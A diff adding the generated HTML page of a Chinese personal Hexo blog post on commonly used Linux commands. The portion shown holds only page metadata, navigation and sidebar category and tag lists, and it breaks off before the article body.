@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <meta name="google-site-verification" content="29vLVh4vA4suQh5SRMCfQisJ8UugXBkjM46VFkYeonU">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000">
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top">
+
+  <!--  -->
+
+  
+  <title>linux常用命令草集 | Hexo</title>
+  <meta name="description" content="你可能不知道的个人常用命令12345678ctrl u 可以删除行内光标所在位置之前的内容 - 常用ctrl l 可以清屏 - 常用ctrl a 可以将光标移至行首ctrl e 可以将光标移至行尾ctrl k 可以删除光标至行尾的所有内容ctrl w 删除你键入的最后一个单词cd - 回到前一个工作路径 特殊符号的应用! -d 检查某个目录是否存在  1234和上面的命令类似。这里是检测目录是否为">
+<meta name="keywords" content="linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux常用命令草集">
+<meta property="og:url" content="https://yaoyuanyy.github.io/2019/10/23/linux常用命令草集/index.html">
+<meta property="og:site_name" content="skyler-blog">
+<meta property="og:description" content="你可能不知道的个人常用命令12345678ctrl u 可以删除行内光标所在位置之前的内容 - 常用ctrl l 可以清屏 - 常用ctrl a 可以将光标移至行首ctrl e 可以将光标移至行尾ctrl k 可以删除光标至行尾的所有内容ctrl w 删除你键入的最后一个单词cd - 回到前一个工作路径 特殊符号的应用! -d 检查某个目录是否存在  1234和上面的命令类似。这里是检测目录是否为">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://yaoyuanyy.github.io/2019/10/23/linux常用命令草集/image-20191019225352819.png">
+<meta property="og:image" content="https://yaoyuanyy.github.io/2019/10/23/linux常用命令草集/image-20191020231155867.png">
+<meta property="og:updated_time" content="2025-11-15T04:49:10.273Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="linux常用命令草集">
+<meta name="twitter:description" content="你可能不知道的个人常用命令12345678ctrl u 可以删除行内光标所在位置之前的内容 - 常用ctrl l 可以清屏 - 常用ctrl a 可以将光标移至行首ctrl e 可以将光标移至行尾ctrl k 可以删除光标至行尾的所有内容ctrl w 删除你键入的最后一个单词cd - 回到前一个工作路径 特殊符号的应用! -d 检查某个目录是否存在  1234和上面的命令类似。这里是检测目录是否为">
+<meta name="twitter:image" content="https://yaoyuanyy.github.io/2019/10/23/linux常用命令草集/image-20191019225352819.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://yaoyuanyy.github.io/2019/10/23/linux常用命令草集/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="skyler-blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  
+  
+  
+</head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/yaoyuanyy" target="_blank">
+          <img class="img-circle img-rotate" src="/images/meinv.jpeg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">skyler</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Web Developer</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> beijing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索">
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech="">
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope="" itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">书单</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/yaoyuanyy" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://juejin.cn/user/729731449759047/posts" target="_blank" title="Juejin" data-toggle="tooltip" data-placement="top"><i class="icon icon-juejin"></i></a></li>
+        
+        <li><a href="https://blog.csdn.net/mingliangniwo" target="_blank" title="Csdn" data-toggle="tooltip" data-placement="top"><i class="icon icon-csdn"></i></a></li>
+        
+        <li><a href="https://yaoyuanyy.github.io" target="_blank" title="Github Pages" data-toggle="tooltip" data-placement="top"><i class="icon icon-github pages"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope="" itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/docker/">docker</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/docker/centos7/">centos7</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/docker/centos8/">centos8</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/http/">http</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/http/javaweb/">javaweb</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">14</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/java/agent/">agent</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/jvm/">jvm</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/spring/">spring</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/java-io/">java io</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java基础/">java基础</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java多线程/">java多线程</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java程序员/">java程序员</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java经典/">java经典</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java网络/">java网络</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/juc/">juc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/jvm虚拟机/">jvm虚拟机</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/jvm虚拟机/springboot/">springboot</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/mac开发工具/">mac开发工具</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/mysql/">mysql</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/spring/">spring</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/springboot/">springboot</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/博客/">博客</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/命令/">命令</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/婚姻/">婚姻</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发工具/">开发工具</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发效率工具/">开发效率工具</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/微服务/">微服务</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/思考/">思考</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/教育/">教育</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/life/">生活</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/考试/">考试</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/股市/">股市</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/股票/">股票</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/计算机组成/">计算机组成</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/认知/">认知</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/认知/读书/">读书</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/读书/">读书</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/运维/">运维</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/面试/">面试</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/高质量文章/">高质量文章</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/">$</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/符号/">$符号</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/2的次方/">2的次方</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/AI提示词/">AI提示词</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/AQS/">AQS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cache/">Cache</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RAM内存/">RAM内存</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ReentrantLock/">ReentrantLock</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ThreadPoolExecutor/">ThreadPoolExecutor</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Value/">\@Value</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/alfred/">alfred</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/apollo-client/">apollo-client</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/centos7/">centos7</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/centos8/">centos8</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/classloader/">classloader</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cursor/">cursor</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/deepseek/">deepseek</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/futex/">futex</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git-revert/">git revert</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/github/">github</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/">hexo</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http/">http</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/https/">https</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iTerm2/">iTerm2</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/interactive-timeout/">interactive_timeout</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/interview/">interview</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/io读写/">io读写</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/">java</a><span class="tag-list-count">9</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java-命令/">java 命令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javaagent/">javaagent</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java多线程/">java多线程</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java并发/">java并发</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java微服务调用/">java微服务调用</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java技术栈/">java技术栈</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java探针/">java探针</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java类加载/">java类加载</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java线程池/">java线程池</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java网络/">java网络</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/juc/">juc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jvm/">jvm</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jvm虚拟机/">jvm虚拟机</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux网络命令/">linux网络命令</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lsof/">lsof</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mac/">mac</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mac网络命令/">mac网络命令</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/">mysql</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql网络/">mysql网络</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/netstat/">netstat</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/prompt/">prompt</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ranger/">ranger</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/spring/">spring</a><span class="tag-list-count">14</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/spring-aop/">spring aop</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/spring-boot/">spring boot</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/spring-cloud微服务调用/">spring cloud微服务调用</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/spring-transaction/">spring transaction</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/springboot/">springboot</a><span class="tag-list-count">13</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/springboot-jar包可运行/">springboot jar包可运行</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/springboot-loader/">springboot loader</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/springboot加载/">springboot加载</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/springcloud/">springcloud</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcpip/">tcpip</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tmux/">tmux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wait-timeout/">wait_timeout</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/书籍会说话/">书籍会说话</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/加密/">加密</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/命令行下载视频/">命令行下载视频</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/大牛技术/">大牛技术</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/婚姻/">婚姻</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/开发效率工具/">开发效率工具</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/得失感悟/">得失感悟</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/思考/">思考</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/找工作/">找工作</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/技术文章/">技术文章</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/投资/">投资</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/拦截器/">拦截器</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/教育/">教育</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数字签名/">数字签名</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数字证书/">数字证书</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/生活/">生活</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/生活感悟/">生活感悟</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/神器/">神器</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/策略模式/">策略模式</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/类加载/">类加载</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/考试/">考试</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/股市/">股市</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/读书/">读书</a><span class="tag-list-count">13</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/读取文件/">读取文件</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/读取日志文件/">读取日志文件</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/随机写/">随机写</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/面试/">面试</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/顺序写/">顺序写</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/" style="font-size: 13px;">$</a> <a href="/tags/符号/" style="font-size: 13px;">$符号</a> <a href="/tags/2的次方/" style="font-size: 13px;">2的次方</a> <a href="/tags/AI提示词/" style="font-size: 13px;">AI提示词</a> <a href="/tags/AQS/" style="font-size: 13px;">AQS</a> <a href="/tags/Cache/" style="font-size: 13px;">Cache</a> <a href="/tags/RAM内存/" style="font-size: 13px;">RAM内存</a> <a href="/tags/ReentrantLock/" style="font-size: 13px;">ReentrantLock</a> <a href="/tags/ThreadPoolExecutor/" style="font-size: 13px;">ThreadPoolExecutor</a> <a href="/tags/Value/" style="font-size: 13px;">\@Value</a> <a href="/tags/alfred/" style="font-size: 13px;">alfred</a> <a href="/tags/apollo-client/" style="font-size: 13px;">apollo-client</a> <a href="/tags/centos7/" style="font-size: 13px;">centos7</a> <a href="/tags/centos8/" style="font-size: 13.25px;">centos8</a> <a href="/tags/classloader/" style="font-size: 13px;">classloader</a> <a href="/tags/cursor/" style="font-size: 13.13px;">cursor</a> <a href="/tags/deepseek/" style="font-size: 13px;">deepseek</a> <a href="/tags/docker/" style="font-size: 13.5px;">docker</a> <a href="/tags/futex/" style="font-size: 13px;">futex</a> <a href="/tags/git/" style="font-size: 13px;">git</a> <a href="/tags/git-revert/" style="font-size: 13px;">git revert</a> <a href="/tags/github/" style="font-size: 13.25px;">github</a> <a href="/tags/hexo/" style="font-size: 13px;">hexo</a> <a href="/tags/http/" style="font-size: 13.13px;">http</a> <a href="/tags/https/" style="font-size: 13.13px;">https</a> <a href="/tags/iTerm2/" style="font-size: 13px;">iTerm2</a> <a href="/tags/interactive-timeout/" style="font-size: 13px;">interactive_timeout</a> <a href="/tags/interview/" style="font-size: 13px;">interview</a> <a href="/tags/io读写/" style="font-size: 13px;">io读写</a> <a href="/tags/java/" style="font-size: 13.75px;">java</a> <a href="/tags/java-命令/" style="font-size: 13px;">java 命令</a> <a href="/tags/javaagent/" style="font-size: 13.25px;">javaagent</a> <a href="/tags/java多线程/" style="font-size: 13.13px;">java多线程</a> <a href="/tags/java并发/" style="font-size: 13px;">java并发</a> <a href="/tags/java微服务调用/" style="font-size: 13px;">java微服务调用</a> <a href="/tags/java技术栈/" style="font-size: 13px;">java技术栈</a> <a href="/tags/java探针/" style="font-size: 13px;">java探针</a> <a href="/tags/java类加载/" style="font-size: 13px;">java类加载</a> <a href="/tags/java线程池/" style="font-size: 13px;">java线程池</a> <a href="/tags/java网络/" style="font-size: 13.13px;">java网络</a> <a href="/tags/juc/" style="font-size: 13px;">juc</a> <a href="/tags/jvm/" style="font-size: 13px;">jvm</a> <a href="/tags/jvm虚拟机/" style="font-size: 13px;">jvm虚拟机</a> <a href="/tags/linux/" style="font-size: 13.5px;">linux</a> <a href="/tags/linux网络命令/" style="font-size: 13.25px;">linux网络命令</a> <a href="/tags/lsof/" style="font-size: 13px;">lsof</a> <a href="/tags/mac/" style="font-size: 13.38px;">mac</a> <a href="/tags/mac网络命令/" style="font-size: 13.13px;">mac网络命令</a> <a href="/tags/mysql/" style="font-size: 13.38px;">mysql</a> <a href="/tags/mysql网络/" style="font-size: 13px;">mysql网络</a> <a href="/tags/netstat/" style="font-size: 13px;">netstat</a> <a href="/tags/prompt/" style="font-size: 13.25px;">prompt</a> <a href="/tags/ranger/" style="font-size: 13px;">ranger</a> <a href="/tags/spring/" style="font-size: 14px;">spring</a> <a href="/tags/spring-aop/" style="font-size: 13.25px;">spring aop</a> <a href="/tags/spring-boot/" style="font-size: 13.63px;">spring boot</a> <a href="/tags/spring-cloud微服务调用/" style="font-size: 13px;">spring cloud微服务调用</a> <a href="/tags/spring-transaction/" style="font-size: 13.13px;">spring transaction</a> <a href="/tags/springboot/" style="font-size: 13.88px;">springboot</a> <a href="/tags/springboot-jar包可运行/" style="font-size: 13px;">springboot jar包可运行</a> <a href="/tags/springboot-loader/" style="font-size: 13px;">springboot loader</a> <a href="/tags/springboot加载/" style="font-size: 13px;">springboot加载</a> <a href="/tags/springcloud/" style="font-size: 13.25px;">springcloud</a> <a href="/tags/tcpip/" style="font-size: 13.13px;">tcpip</a> <a href="/tags/tmux/" style="font-size: 13px;">tmux</a> <a href="/tags/wait-timeout/" style="font-size: 13px;">wait_timeout</a> <a href="/tags/书籍会说话/" style="font-size: 13px;">书籍会说话</a> <a href="/tags/加密/" style="font-size: 13.13px;">加密</a> <a href="/tags/命令行下载视频/" style="font-size: 13px;">命令行下载视频</a> <a href="/tags/大牛技术/" style="font-size: 13px;">大牛技术</a> <a href="/tags/婚姻/" style="font-size: 13px;">婚姻</a> <a href="/tags/开发效率工具/" style="font-size: 13.13px;">开发效率工具</a> <a href="/tags/得失感悟/" style="font-size: 13px;">得失感悟</a> <a href="/tags/思考/" style="font-size: 13px;">思考</a> <a href="/tags/找工作/" style="font-size: 13px;">找工作</a> <a href="/tags/技术文章/" style="font-size: 13px;">技术文章</a> <a href="/tags/投资/" style="font-size: 13.25px;">投资</a> <a href="/tags/拦截器/" style="font-size: 13px;">拦截器</a> <a href="/tags/教育/" style="font-size: 13px;">教育</a> <a href="/tags/数字签名/" style="font-size: 13.13px;">数字签名</a> <a href="/tags/数字证书/" style="font-size: 13.13px;">数字证书</a> <a href="/tags/生活/" style="font-size: 13.13px;">生活</a> <a href="/tags/生活感悟/" style="font-size: 13px;">生活感悟</a> <a href="/tags/神器/" style="font-size: 13px;">神器</a> <a href="/tags/策略模式/" style="font-size: 13px;">策略模式</a> <a href="/tags/类加载/" style="font-size: 13.13px;">类加载</a> <a href="/tags/考试/" style="font-size: 13.25px;">考试</a> <a href="/tags/股市/" style="font-size: 13.13px;">股市</a> <a href="/tags/读书/" style="font-size: 13.88px;">读书</a> <a href="/tags/读取文件/" style="font-size: 13px;">读取文件</a> <a href="/tags/读取日志文件/" style="font-size: 13px;">读取日志文件</a> <a href="/tags/随机写/" style="font-size: 13px;">随机写</a> <a href="/tags/面试/" style="font-size: 13px;">面试</a> <a href="/tags/顺序写/" style="font-size: 13px;">顺序写</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
